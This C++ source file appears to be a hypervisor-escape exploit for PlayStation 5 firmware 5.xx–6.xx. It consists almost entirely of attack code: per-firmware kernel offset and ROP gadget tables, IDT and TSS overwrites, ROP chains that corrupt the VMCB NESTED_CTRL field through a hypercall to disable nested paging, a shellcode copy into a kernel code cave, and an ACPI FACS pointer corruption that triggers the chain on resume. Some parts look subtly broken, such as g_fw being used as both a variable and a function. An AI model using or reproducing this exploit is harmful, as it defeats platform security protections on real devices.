#include "hv_defeat_0506.h"
#include "util.h"
#include "offsets.h"
#include <cstring>
#include <sys/mman.h>
#include <machine/segments.h>
#include <machine/tss.h>

#define NESTED_CTRL_GMET_ENABLE 0x8
#define IPI_STOP 252

extern "C" {
#include <ps5/kernel.h>
}

// Global variables that need to be initialized
static uint64_t g_ktext = 0;
static uint64_t g_dmap = 0;
static uint32_t g_fw = 0;

// Offset list structure for 5.x and 6.x
struct offset_list_0506 {
	uint64_t ACPIGBL_FACS;
	uint64_t IDT;
	uint64_t COMMON_TSS;
	uint64_t STOPPED_CPUS;
	uint64_t FUN_STOP_CPUS;
	uint64_t FUN_AS_LAPIC_EOI;
	uint64_t FUN_HV_UNMAP_PT_TMR;
	uint64_t FUN_MEMCPY;
	uint64_t GAD_ADD_RSP_28_POP_RBP_RET;
	uint64_t GAD_IRETQ;
	uint64_t GAD_POP_RDI_RET;
	uint64_t GAD_POP_RSI_RET;
	uint64_t GAD_POP_RDX_RET;
	uint64_t GAD_POP_RSP_RET;
	uint64_t GAD_MOV_QWORD_PTR_RDI_RSI_POP_RBP_RET;
	uint64_t KERNEL_CODE_CAVE;
};

// Offset tables for each firmware version
static const offset_list_0506 offsets_0500 = {
	.ACPIGBL_FACS = (0xFFFFFFFF83C982A0 - 0xFFFFFFFF80210000),
	.IDT = (0xFFFFFFFF8745DCA0 - 0xFFFFFFFF80210000),
	.COMMON_TSS = (0xFFFFFFFF87460850 - 0xFFFFFFFF80210000),
	.STOPPED_CPUS = (0xFFFFFFFF87520DE0 - 0xFFFFFFFF80210000),
	.FUN_STOP_CPUS = (0xFFFFFFFF80CAB210 - 0xFFFFFFFF80210000),
	.FUN_AS_LAPIC_EOI = (0xFFFFFFFF804486E0 - 0xFFFFFFFF80210000),
	.FUN_HV_UNMAP_PT_TMR = (0xFFFFFFFF80DA9060 - 0xFFFFFFFF80210000),
	.FUN_MEMCPY = (0xFFFFFFFF80489E30 - 0xFFFFFFFF80210000),
	.GAD_ADD_RSP_28_POP_RBP_RET = (0xffffffff80b93d94 - 0xFFFFFFFF80210000),
	.GAD_IRETQ = (0xffffffff8044b06d - 0xFFFFFFFF80210000),
	.GAD_POP_RDI_RET = (0xffffffff803e8778 - 0xFFFFFFFF80210000),
	.GAD_POP_RSI_RET = (0xffffffff803a92b0 - 0xFFFFFFFF80210000),
	.GAD_POP_RDX_RET = (0xffffffff8040dafc - 0xFFFFFFFF80210000),
	.GAD_POP_RSP_RET = (0xffffffff8045a830 - 0xFFFFFFFF80210000),
	.GAD_MOV_QWORD_PTR_RDI_RSI_POP_RBP_RET = (0xffffffff80603c0a - 0xFFFFFFFF80210000),
	.KERNEL_CODE_CAVE = 0x500,
};

static const offset_list_0506 offsets_0502 = {
	.ACPIGBL_FACS = (0xFFFFFFFF83C982A0 - 0xFFFFFFFF80210000),
	.IDT = (0xFFFFFFFF8745DCA0 - 0xFFFFFFFF80210000),
	.COMMON_TSS = (0xFFFFFFFF87460850 - 0xFFFFFFFF80210000),
	.STOPPED_CPUS = (0xFFFFFFFF87520DE0 - 0xFFFFFFFF80210000),
	.FUN_STOP_CPUS = (0xFFFFFFFF80CAB210 - 0xFFFFFFFF80210000),
	.FUN_AS_LAPIC_EOI = (0xFFFFFFFF804486E0 - 0xFFFFFFFF80210000),
	.FUN_HV_UNMAP_PT_TMR = (0xFFFFFFFF80DA9060 - 0xFFFFFFFF80210000),
	.FUN_MEMCPY = (0xFFFFFFFF80489E30 - 0xFFFFFFFF80210000),
	.GAD_ADD_RSP_28_POP_RBP_RET = (0xffffffff80b93d94 - 0xFFFFFFFF80210000),
	.GAD_IRETQ = (0xffffffff8044b06d - 0xFFFFFFFF80210000),
	.GAD_POP_RDI_RET = (0xffffffff803e8778 - 0xFFFFFFFF80210000),
	.GAD_POP_RSI_RET = (0xffffffff803a92b0 - 0xFFFFFFFF80210000),
	.GAD_POP_RDX_RET = (0xffffffff8054d532 - 0xFFFFFFFF80210000),
	.GAD_POP_RSP_RET = (0xffffffff8045a830 - 0xFFFFFFFF80210000),
	.GAD_MOV_QWORD_PTR_RDI_RSI_POP_RBP_RET = (0xffffffff80603c0a - 0xFFFFFFFF80210000),
	.KERNEL_CODE_CAVE = 0x500,
};

static const offset_list_0506 offsets_0510 = {
	.ACPIGBL_FACS = (0xFFFFFFFF83C982A0 - 0xFFFFFFFF80210000),
	.IDT = (0xFFFFFFFF8745DCA0 - 0xFFFFFFFF80210000),
	.COMMON_TSS = (0xFFFFFFFF87460850 - 0xFFFFFFFF80210000),
	.STOPPED_CPUS = (0xFFFFFFFF87520DE0 - 0xFFFFFFFF80210000),
	.FUN_STOP_CPUS = (0xFFFFFFFF80CAB460 - 0xFFFFFFFF80210000),
	.FUN_AS_LAPIC_EOI = (0xFFFFFFFF804486E0 - 0xFFFFFFFF80210000),
	.FUN_HV_UNMAP_PT_TMR = (0xFFFFFFFF80DA9390 - 0xFFFFFFFF80210000),
	.FUN_MEMCPY = (0xFFFFFFFF80489E30 - 0xFFFFFFFF80210000),
	.GAD_ADD_RSP_28_POP_RBP_RET = (0xffffffff80b93fe4 - 0xFFFFFFFF80210000),
	.GAD_IRETQ = (0xffffffff8044b06d - 0xFFFFFFFF80210000),
	.GAD_POP_RDI_RET = (0xffffffff803e8778 - 0xFFFFFFFF80210000),
	.GAD_POP_RSI_RET = (0xffffffff803a92b0 - 0xFFFFFFFF80210000),
	.GAD_POP_RDX_RET = (0xffffffff8054d532 - 0xFFFFFFFF80210000),
	.GAD_POP_RSP_RET = (0xffffffff8045a830 - 0xFFFFFFFF80210000),
	.GAD_MOV_QWORD_PTR_RDI_RSI_POP_RBP_RET = (0xffffffff80603c0a - 0xFFFFFFFF80210000),
	.KERNEL_CODE_CAVE = 0x500,
};

static const offset_list_0506 offsets_0550 = {
	.ACPIGBL_FACS = (0xFFFFFFFF83C942A0 - 0xFFFFFFFF80210000),
	.IDT = (0xFFFFFFFF8745DCA0 - 0xFFFFFFFF80210000),
	.COMMON_TSS = (0xFFFFFFFF87460850 - 0xFFFFFFFF80210000),
	.STOPPED_CPUS = (0xFFFFFFFF87520DE0 - 0xFFFFFFFF80210000),
	.FUN_STOP_CPUS = (0xFFFFFFFF80CAC250 - 0xFFFFFFFF80210000),
	.FUN_AS_LAPIC_EOI = (0xFFFFFFFF804486A0 - 0xFFFFFFFF80210000),
	.FUN_HV_UNMAP_PT_TMR = (0xFFFFFFFF80DAA180 - 0xFFFFFFFF80210000),
	.FUN_MEMCPY = (0xFFFFFFFF80489DF0 - 0xFFFFFFFF80210000),
	.GAD_ADD_RSP_28_POP_RBP_RET = (0xffffffff80b94dd4 - 0xFFFFFFFF80210000),
	.GAD_IRETQ = (0xFFFFFFFF8044B02D - 0xFFFFFFFF80210000),
	.GAD_POP_RDI_RET = (0xffffffff803e8738 - 0xFFFFFFFF80210000),
	.GAD_POP_RSI_RET = (0xffffffff803a9270 - 0xFFFFFFFF80210000),
	.GAD_POP_RDX_RET = (0xffffffff8054d4f2 - 0xFFFFFFFF80210000),
	.GAD_POP_RSP_RET = (0xffffffff8045a830 - 0xFFFFFFFF80210000),
	.GAD_MOV_QWORD_PTR_RDI_RSI_POP_RBP_RET = (0xffffffff80603cba - 0xFFFFFFFF80210000),
	.KERNEL_CODE_CAVE = 0x500,
};

static const offset_list_0506 offsets_0600 = {
	.ACPIGBL_FACS = (0xFFFFFFFF83C04540 - 0xFFFFFFFF80210000),
	.IDT = (0xFFFFFFFF873CDDE0 - 0xFFFFFFFF80210000),
	.COMMON_TSS = (0xFFFFFFFF873D0A00 - 0xFFFFFFFF80210000),
	.STOPPED_CPUS = (0xFFFFFFFF87520DE0 - 0xFFFFFFFF80210000),
	.FUN_STOP_CPUS = (0xFFFFFFFF80CD13B0 - 0xFFFFFFFF80210000),
	.FUN_AS_LAPIC_EOI = (0xFFFFFFFF80451E60 - 0xFFFFFFFF80210000),
	.FUN_HV_UNMAP_PT_TMR = (0xFFFFFFFF80DD36B0 - 0xFFFFFFFF80210000),
	.FUN_MEMCPY = (0xFFFFFFFF804935B0 - 0xFFFFFFFF80210000),
	.GAD_ADD_RSP_28_POP_RBP_RET = (0xffffffff80bb6ad4 - 0xFFFFFFFF80210000),
	.GAD_IRETQ = (0xFFFFFFFF804547ED - 0xFFFFFFFF80210000),
	.GAD_POP_RDI_RET = (0xffffffff803f1ef8 - 0xFFFFFFFF80210000),
	.GAD_POP_RSI_RET = (0xffffffff803b2a30 - 0xFFFFFFFF80210000),
	.GAD_POP_RDX_RET = (0xffffffff803f321e - 0xFFFFFFFF80210000),
	.GAD_POP_RSP_RET = (0xffffffff8045a830 - 0xFFFFFFFF80210000),
	.GAD_MOV_QWORD_PTR_RDI_RSI_POP_RBP_RET = (0xffffffff806141fa - 0xFFFFFFFF80210000),
	.KERNEL_CODE_CAVE = 0x500,
};

static const offset_list_0506 offsets_0602 = {
	.ACPIGBL_FACS = (0xFFFFFFFF83C04540 - 0xFFFFFFFF80210000),
	.IDT = (0xFFFFFFFF873CDDE0 - 0xFFFFFFFF80210000),
	.COMMON_TSS = (0xFFFFFFFF873D0A00 - 0xFFFFFFFF80210000),
	.STOPPED_CPUS = (0xFFFFFFFF87520DE0 - 0xFFFFFFFF80210000),
	.FUN_STOP_CPUS = (0xFFFFFFFF80CD1390 - 0xFFFFFFFF80210000),
	.FUN_AS_LAPIC_EOI = (0xFFFFFFFF80451E60 - 0xFFFFFFFF80210000),
	.FUN_HV_UNMAP_PT_TMR = (0xFFFFFFFF80DD3690 - 0xFFFFFFFF80210000),
	.FUN_MEMCPY = (0xFFFFFFFF804935B0 - 0xFFFFFFFF80210000),
	.GAD_ADD_RSP_28_POP_RBP_RET = (0xffffffff80bb6ab4 - 0xFFFFFFFF80210000),
	.GAD_IRETQ = (0xFFFFFFFF804547ED - 0xFFFFFFFF80210000),
	.GAD_POP_RDI_RET = (0xffffffff803f1ef8 - 0xFFFFFFFF80210000),
	.GAD_POP_RSI_RET = (0xffffffff803b2a30 - 0xFFFFFFFF80210000),
	.GAD_POP_RDX_RET = (0xffffffff804c48da - 0xFFFFFFFF80210000),
	.GAD_POP_RSP_RET = (0xffffffff8045a830 - 0xFFFFFFFF80210000),
	.GAD_MOV_QWORD_PTR_RDI_RSI_POP_RBP_RET = (0xffffffff806141fa - 0xFFFFFFFF80210000),
	.KERNEL_CODE_CAVE = 0x500,
};

static offset_list_0506 get_offsets_for_fw(uint32_t fw) {
	switch (fw) {
		case 0x0500: return offsets_0500;
		case 0x0502: return offsets_0502;
		case 0x0510: return offsets_0510;
		case 0x0550: return offsets_0550;
		case 0x0600: return offsets_0600;
		case 0x0602: return offsets_0602;
		default: return offsets_0602;
	}
}

static int get_vcpu(uint32_t fw) {
	if (fw >= 0x0500 && fw < 0x0600) {
		return 0;
	} else if (fw >= 0x0600 && fw < 0x0650) {
		return 1;
	}
	return -1;
}

static uint64_t get_hv_shm(uint32_t fw) {
	if (fw >= 0x0500 && fw < 0x0600) {
		return 0x62a01000;
	} else if (fw >= 0x0600 && fw < 0x0650) {
		return 0x62a22000;
	}
	return -1;
}

static uint64_t get_vmcb(uint32_t fw, int core) {
	if (fw >= 0x0500 && fw < 0x0600) {
		return (uint64_t)0x62a08000 + (uint64_t)core * 0x2000;
	} else if (fw >= 0x0600 && fw < 0x0650) {
		return (uint64_t)0x62a57000 + (uint64_t)core * 0x2000;
	}
	return -1;
}

static uint64_t alloc_page() {
	// Allocate a page and get its physical address
	void *page = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE,
					  MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (!page) return 0;

	// Fault it to force physical allocation
	*(uint8_t *)page = 0;

	return pmap_kextract((uint64_t)page);
}

static uint64_t pa_to_dmap(uint64_t pa) {
	return g_dmap + pa;
}

static void kwrite(uint64_t dst, const void *src, uint64_t len) {
	kernel_copyin((void *)src, dst, len);
}

static void kwrite64(uint64_t dst, uint64_t val) {
	kernel_copyin(&val, dst, 8);
}

static void setidt(int idx, uintptr_t func, int typ, int dpl, int ist, const offset_list_0506 &offsets) {
	struct gate_descriptor ip = {};
	ip.gd_looffset = func & 0xFFFFULL;
	ip.gd_selector = GSEL(GCODE_SEL, SEL_KPL);
	ip.gd_ist = ist;
	ip.gd_xx = 0;
	ip.gd_type = typ;
	ip.gd_dpl = dpl;
	ip.gd_p = 1;
	ip.gd_hioffset = (func >> 16) & 0xFFFFULL;
	kwrite(g_ktext + offsets.IDT + idx * sizeof(struct gate_descriptor), &ip, sizeof(ip));
}

static void build_gp_rop(uintptr_t ist, int vcpu, int tmr_id,
						 size_t shellcode_kernel_len, const offset_list_0506 &offsets) {
	uint64_t rop_buf[256] = {};
	uint64_t *rop = rop_buf;

	if (vcpu != 0) {
		// Send IPI to vcpu.
		*rop++ = g_ktext + offsets.GAD_POP_RDI_RET;
		*rop++ = 1 << vcpu;
		*rop++ = g_ktext + offsets.FUN_STOP_CPUS;

		// Clear stopped_cpus.
		*rop++ = g_ktext + offsets.GAD_POP_RDI_RET;
		*rop++ = g_ktext + offsets.STOPPED_CPUS;
		*rop++ = g_ktext + offsets.GAD_POP_RSI_RET;
		*rop++ = 0;
		*rop++ = g_ktext + offsets.GAD_MOV_QWORD_PTR_RDI_RSI_POP_RBP_RET;
		*rop++ = 0xDEADBEEF;
	} else {
		// Corrupt NESTED_CTRL in vmcb via hv_unmap_pt_tmr hypercall.
		*rop++ = g_ktext + offsets.GAD_POP_RDI_RET;
		*rop++ = tmr_id;
		*rop++ = g_ktext + offsets.GAD_POP_RSI_RET;
		*rop++ = 0x1000;
		*rop++ = g_ktext + offsets.GAD_POP_RDX_RET;
		*rop++ = 0;
		*rop++ = g_ktext + offsets.FUN_HV_UNMAP_PT_TMR;

		// Disable npt in all vmcb's.
		*rop++ = g_ktext + offsets.GAD_POP_RSI_RET;
		*rop++ = NESTED_CTRL_GMET_ENABLE;
		for (int i = 0; i < 16; i++) {
			*rop++ = g_ktext + offsets.GAD_POP_RDI_RET;
			*rop++ = pa_to_dmap(get_vmcb(g_fw, i) + 0x90);
			*rop++ = g_ktext + offsets.GAD_MOV_QWORD_PTR_RDI_RSI_POP_RBP_RET;
			*rop++ = 0xDEADBEEF;
		}
	}

	// Trigger vmmcall again to reload vmcb.
	*rop++ = g_ktext + offsets.GAD_POP_RDI_RET;
	*rop++ = 0;
	*rop++ = g_ktext + offsets.GAD_POP_RSI_RET;
	*rop++ = 0;
	*rop++ = g_ktext + offsets.GAD_POP_RDX_RET;
	*rop++ = 0xffffffffffffffff;
	*rop++ = g_ktext + offsets.FUN_HV_UNMAP_PT_TMR;

	// Copy shellcode.
	*rop++ = g_ktext + offsets.GAD_POP_RDI_RET;
	*rop++ = g_ktext + offsets.KERNEL_CODE_CAVE;
	*rop++ = g_ktext + offsets.GAD_POP_RSI_RET;
	*rop++ = 0;  // Placeholder - actual shellcode handling done elsewhere
	*rop++ = g_ktext + offsets.GAD_POP_RDX_RET;
	*rop++ = shellcode_kernel_len;
	*rop++ = g_ktext + offsets.FUN_MEMCPY;

	// Jump to shellcode.
	*rop++ = g_ktext + offsets.KERNEL_CODE_CAVE;

	kwrite(ist + 0x1000, rop_buf, (uintptr_t)rop - (uintptr_t)rop_buf);
}

static void build_ipi_rop(uintptr_t ist, int vcpu, int tmr_id, const offset_list_0506 &offsets) {
	uint64_t rop_buf[256] = {};
	uint64_t *rop = rop_buf;

	// Corrupt NESTED_CTRL in vmcb via hv_unmap_pt_tmr hypercall.
	*rop++ = g_ktext + offsets.GAD_POP_RDI_RET;
	*rop++ = tmr_id;
	*rop++ = g_ktext + offsets.GAD_POP_RSI_RET;
	*rop++ = 0x1000;
	*rop++ = g_ktext + offsets.GAD_POP_RDX_RET;
	*rop++ = 0;
	*rop++ = g_ktext + offsets.FUN_HV_UNMAP_PT_TMR;

	// Disable npt in all vmcb's.
	*rop++ = g_ktext + offsets.GAD_POP_RSI_RET;
	*rop++ = NESTED_CTRL_GMET_ENABLE;
	for (int i = 0; i < 16; i++) {
		*rop++ = g_ktext + offsets.GAD_POP_RDI_RET;
		*rop++ = pa_to_dmap(get_vmcb(g_fw, i) + 0x90);
		*rop++ = g_ktext + offsets.GAD_MOV_QWORD_PTR_RDI_RSI_POP_RBP_RET;
		*rop++ = 0xDEADBEEF;
	}

	// Trigger vmmcall again to reload vmcb.
	*rop++ = g_ktext + offsets.GAD_POP_RDI_RET;
	*rop++ = 0;
	*rop++ = g_ktext + offsets.GAD_POP_RSI_RET;
	*rop++ = 0;
	*rop++ = g_ktext + offsets.GAD_POP_RDX_RET;
	*rop++ = 0xffffffffffffffff;
	*rop++ = g_ktext + offsets.FUN_HV_UNMAP_PT_TMR;

	// Set stopped_cpus.
	*rop++ = g_ktext + offsets.GAD_POP_RDI_RET;
	*rop++ = g_ktext + offsets.STOPPED_CPUS;
	*rop++ = g_ktext + offsets.GAD_POP_RSI_RET;
	*rop++ = 1 << vcpu;
	*rop++ = g_ktext + offsets.GAD_MOV_QWORD_PTR_RDI_RSI_POP_RBP_RET;
	*rop++ = 0xDEADBEEF;

	// Call as_lapic_eoi.
	*rop++ = g_ktext + offsets.FUN_AS_LAPIC_EOI;

	// Pivot to iretq.
	*rop++ = g_ktext + offsets.GAD_POP_RSP_RET;
	*rop++ = ist + 0x00;

	kwrite64(ist + 0x00, g_ktext + offsets.GAD_IRETQ);
	kwrite(ist + 0x30 + 0x08, rop_buf, (uintptr_t)rop - (uintptr_t)rop_buf);
}

int hv_defeat_0506(void) {
	// Initialize global variables
	g_fw = g_fw() & 0xFFFF;
	g_ktext = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
	g_dmap = get_dmap_base();

	offset_list_0506 offsets = get_offsets_for_fw(g_fw);

	int vcpu = get_vcpu(g_fw);
	if (vcpu < 0) {
		return -1;
	}

	int tmr_id = (get_vmcb(g_fw, vcpu) - get_hv_shm(g_fw) - 0x208) / 0x18;

	uint64_t ist_gp_pa = alloc_page();
	if (!ist_gp_pa) {
		return -1;
	}

	uintptr_t ist_gp = pa_to_dmap(ist_gp_pa);
	build_gp_rop(ist_gp, vcpu, tmr_id, 0, offsets);
	kwrite64(g_ktext + offsets.COMMON_TSS + 0 * sizeof(struct amd64tss) +
			 offsetof(struct amd64tss, tss_ist6),
			 ist_gp + 0x1000);
	setidt(IDT_GP, g_ktext + offsets.GAD_ADD_RSP_28_POP_RBP_RET, SDT_SYSIGT,
		   SEL_KPL, 6, offsets);

	if (vcpu != 0) {
		uint64_t ist_ipi_pa = alloc_page();
		if (!ist_ipi_pa) {
			return -1;
		}

		uintptr_t ist_ipi = pa_to_dmap(ist_ipi_pa);
		build_ipi_rop(ist_ipi, vcpu, tmr_id, offsets);
		kwrite64(g_ktext + offsets.COMMON_TSS + vcpu * sizeof(struct amd64tss) +
				 offsetof(struct amd64tss, tss_ist7),
				 ist_ipi + 0x30);
		setidt(IPI_STOP, g_ktext + offsets.GAD_ADD_RSP_28_POP_RBP_RET, SDT_SYSIGT,
			   SEL_KPL, 7, offsets);
	}

	// During suspend, AcpiSetFirmwareWakingVector will corrupt its own pointer,
	// and during resume it will trigger #GP, thus executing our ROP chain.
	kwrite64(g_ktext + offsets.ACPIGBL_FACS,
			 g_ktext + offsets.ACPIGBL_FACS - 8);

	return 0;
}
